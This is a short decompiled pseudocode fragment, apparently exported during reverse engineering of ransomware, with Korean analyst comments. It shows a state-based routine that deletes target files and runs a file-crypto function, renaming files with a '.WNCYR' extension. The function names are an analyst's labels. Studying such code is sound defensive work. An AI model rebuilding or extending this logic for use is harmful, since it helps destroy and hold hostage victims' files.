// --- Metadata ---
// Function Name: decryptFileByState_10002940
// Address: 0x10002940
// Exported At: 20250522_102914
// Signature: unknown_signature
// ---------------
int __thiscall decryptFileByState_10002940(void *this, wchar_t *Destination, int a3)
{
  switch ( DetermineState_10002E70(Destination, a3) )
  {
    case 0:
      return 1;
    case 2:
      DeleteFileW_0(Destination);               // 대상 파일 삭제 
      return 1;
    case 3:
      if ( decryptFiles_10002200(this, Destination, 3) )// 복호화 시도 후 성공 시: 파일명 뒤에 .WNCYR 확장자 추가 
      {
        wcscat(Destination, L".WNCYR");
        wcscat(Destination + 360, L".WNCYR");
        *((_DWORD *)Destination + 312) = 5;
      }
      return 0;
    case 4:
      decryptFiles_10002200(this, Destination, 4);
      return 1;
    default:
      return 0;
  }
}
